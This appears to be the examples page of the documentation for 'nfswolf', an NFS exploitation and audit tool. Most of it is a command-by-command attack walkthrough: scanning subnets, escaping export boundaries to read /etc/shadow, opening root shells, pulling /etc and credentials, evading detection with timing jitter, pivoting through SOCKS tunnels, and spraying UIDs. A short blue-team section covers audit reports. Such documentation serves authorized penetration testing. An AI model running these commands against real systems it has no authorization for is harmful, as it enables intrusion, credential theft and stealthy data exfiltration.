# Examples

End-to-end workflow examples covering common assessment scenarios. Each example shows the full command line, what it does, and what to expect.

!!! danger "Authorized targets only"
    Every example below performs active operations against NFS services. Only run these against systems you own or have explicit written authorization to test.

## Red team: full attack path

A complete engagement from network discovery through data exfiltration.

### Step 1: Discover NFS servers

```bash
nfswolf scan 10.0.0.0/24
```

Probes every host on the /24 for portmapper (111/tcp) and NFS (2049/tcp). Reports exports, NFS versions, auth flavors, and connected clients. Note the exports and file handles in the output.

### Step 2: Audit for weaknesses

```bash
nfswolf analyze 10.0.0.5 --json --quiet > audit.json
```

Runs 30+ security checks against the target. The `--json` flag captures machine-readable results; `--quiet` suppresses status lines so only the JSON hits stdout.

### Step 3: Escape the export boundary

```bash
nfswolf escape 10.0.0.5 --read-shadow
```

Attempts to break out of every discovered export to the filesystem root using subtree_check bypass. The `--read-shadow` flag attempts to read `/etc/shadow` from any escaped filesystem as a proof of impact. On success, prints the root handle.

### Step 4: Shell in with the escaped handle

```bash
nfswolf shell 10.0.0.5 --handle 01000700020000020000000002000000... --uid 0 --allow-write
```

Opens an interactive shell rooted at the escaped filesystem handle. With `--uid 0` and no root_squash, you have full read/write access to the entire filesystem. Run `secrets-scan` to find credentials, `suid-scan` to find privilege escalation binaries, or `get -r /etc` to exfiltrate configuration files.

### Step 5: Generate a report

```bash
nfswolf convert -i audit.json --format html -o report.html --title "ACME Corp NFS Assessment"
```

Renders the analysis results into a self-contained HTML report with severity charts, finding details, and remediation guidance.

---

## Blue team: security assessment

A defensive assessment to identify and remediate NFS misconfigurations.

```bash
# Scan your infrastructure
nfswolf scan 10.0.0.0/16 -f additional-hosts.txt --json scan.json

# Audit each discovered server
nfswolf analyze 10.0.0.5
nfswolf analyze 10.0.0.12
nfswolf analyze 10.0.0.30

# Generate reports in multiple formats
nfswolf analyze 10.0.0.5 --json > results.json
nfswolf convert -i results.json --format html -o report.html
nfswolf convert -i results.json --format csv -o findings.csv
nfswolf convert -i results.json --format markdown -o report.md
```

The console output highlights critical findings with severity ratings. The CSV export integrates with ticketing systems for remediation tracking. Focus on findings rated Critical and High first; these typically involve `no_root_squash`, missing `subtree_check`, or exports accessible to `*`.

---

## Quick assessment one-liner

When you need a fast answer about a single server:

```bash
nfswolf analyze 10.0.0.5
```

This runs every check and prints findings to the terminal with ANSI-colored severity ratings. No flags needed; the defaults cover the standard assessment surface. Total runtime is typically 5-15 seconds.

For a slightly richer view that also tests export escape:

```bash
nfswolf analyze 10.0.0.5 --test-read /etc/shadow --test-read /etc/passwd
```

This adds post-escape file readability tests. If the server is vulnerable to subtree_check bypass and the export lacks root_squash, the analyzer will confirm it can read the target files.

---

## Targeted escape against a specific export

When you know which export to target:

=== "Fast mode"

    ```bash
    nfswolf escape --fast 10.0.0.5:/srv/nfs
    ```

    Single export, single version, no brute-force. Runs 10-80 RPCs and completes in under a second. Use this during initial triage.

=== "Full mode"

    ```bash
    nfswolf escape 10.0.0.5:/srv/nfs
    ```

    Full seven-phase pipeline against the specified export: gathers seeds from MOUNT v3, MOUNT v1, and NFSv4, walks upward, constructs candidates for all 18 filesystem types, probes across versions, and reports every confirmed escape path.

=== "All exports"

    ```bash
    nfswolf escape 10.0.0.5
    ```

    Discovers all exports on the server and runs the full pipeline against each one. Reports deduplicated results: multiple exports on the same filesystem produce a single escape handle.

The escape output includes a ready-to-paste `nfswolf shell --handle` command:

```
[+] Escape successful: ext4 root (inode 2)
    Handle: 01000700020000020000000002000000...
    Run:    nfswolf shell 10.0.0.5 --handle 01000700020000020000000002000000...
```

---

## Stealth mode: slow scan with jitter

When evasion matters more than speed:

```bash
# Slow scan: 500ms base delay + 0-500ms random jitter per RPC call
nfswolf scan 10.0.0.0/24 --delay 500 --jitter 500

# Stealthy analysis: 1-3 second gaps between calls
nfswolf analyze 10.0.0.5 --delay 1000 --jitter 2000

# Stealth shell session
nfswolf shell 10.0.0.5:/srv --delay 200 --jitter 300
```

The `--delay` flag inserts a fixed pause before each RPC call. The `--jitter` flag adds a random 0-to-N millisecond offset on top. Together, they produce irregular timing that blends with normal NFS client traffic patterns.

!!! tip "Combining with concurrency"
    For scans, pair stealth delays with reduced concurrency to limit the burst profile:

    ```bash
    nfswolf scan 10.0.0.0/24 --delay 500 --jitter 500 -c 4
    ```

    The `-c 4` flag limits concurrent host scans to 4 (default is 256).

---

## Through a SOCKS5 proxy

When the target is only reachable through a pivot host:

```bash
# Set up a SOCKS5 tunnel via SSH
ssh -D 1080 -N pivot-host &

# All NFSWolf traffic routes through the tunnel
nfswolf scan 10.129.0.0/24 --proxy 127.0.0.1:1080
nfswolf analyze 10.129.0.5 --proxy 127.0.0.1:1080
nfswolf escape 10.129.0.5:/srv --proxy 127.0.0.1:1080
nfswolf shell 10.129.0.5:/srv --proxy 127.0.0.1:1080
```

The SOCKS5 proxy is inline, with no external crate dependency. It handles DNS resolution on the proxy side, so target hostnames do not need to resolve locally.

!!! warning "UDP not supported"
    SOCKS5 only tunnels TCP. The `--scan-udp` flag cannot be combined with `--proxy`. If you need UDP NFS discovery through a tunnel, run nfswolf directly on the pivot host.

---

## NFSv4-only target

When the server runs NFSv4 without portmapper or MOUNT (common in hardened environments):

```bash
# Skip portmapper and MOUNT, connect directly via NFSv4
nfswolf shell 10.0.0.5:/ --nfs-version 4 --skip-rpc --skip-mountd
```

NFSv4 uses a pseudo-filesystem rooted at `/` on port 2049 and does not require portmapper or the MOUNT protocol. The `--skip-rpc` and `--skip-mountd` flags prevent timeout delays from probing services that do not exist.

```bash
# Escape via pure NFSv4 (no MOUNT handles needed)
nfswolf escape 10.0.0.5 --nfs-version 4 --skip-rpc --skip-mountd

# Analyze with only NFSv4 checks
nfswolf analyze 10.0.0.5 --skip-rpc --skip-mountd
```

If the NFS port is also non-standard:

```bash
nfswolf shell 10.0.0.5:/ --nfs-version 4 --skip-rpc --skip-mountd --nfs-port 12049
```

---

## Working with raw file handles

File handles obtained from `escape`, `brute-handle`, or a packet capture can be used directly with `shell`, `mount`, and other subcommands, bypassing the MOUNT protocol entirely.

```bash
# Decode a handle to understand its structure
nfswolf decode 01000700020000020000000002000000

# Shell into a server using a known handle
nfswolf shell 10.0.0.5 --handle 01000700020000020000000002000000

# FUSE-mount with an escaped handle
nfswolf mount 10.0.0.5 /mnt/escaped --handle 01000700020000020000000002000000

# FUSE-mount and immediately unmount from the server (stealth)
nfswolf mount 10.0.0.5 /mnt/target -e /srv --hide
```

The `--handle` flag accepts any hex-encoded NFS file handle (v2: 32 bytes, v3: variable up to 64 bytes, v4: variable up to 128 bytes). The version is auto-detected from the handle length and server response unless `--nfs-version` is specified.

---

## Scan with auto-escape

Combine discovery and exploitation in a single pass:

```bash
nfswolf scan 10.0.0.0/24 --auto-escape
```

After discovering each host's exports, the scanner automatically runs a fast escape probe against every export. Successful escapes print a ready-to-run `nfswolf shell --handle` command inline with the scan results.

```bash
# With JSON output for automation
nfswolf scan 10.0.0.0/24 --auto-escape --json results.json
```

---

## Credential control

```bash
# Connect as uid 0 with shadow-group GID to read /etc/shadow
nfswolf shell 10.0.0.5:/srv --uid 0 --gid 42

# Add multiple auxiliary groups
nfswolf shell 10.0.0.5:/srv --uid 0 --aux-gids 0,42,15,33

# UID spray to find which identities have access
nfswolf uid-spray 10.0.0.5:/srv --uid-start 0 --uid-end 5000

# Brute-force handles with a known seed
nfswolf brute-handle 10.0.0.5:/srv --inode-start 2 --inode-end 1000
```

!!! info "Auto-escalation"
    The `shell` and `mount` subcommands automatically try alternative credentials when an operation fails with `NFS3ERR_ACCES`. The credential ladder tries the file owner first, then root, then identities observed in directory listings. You do not need to manually switch UIDs in most cases.
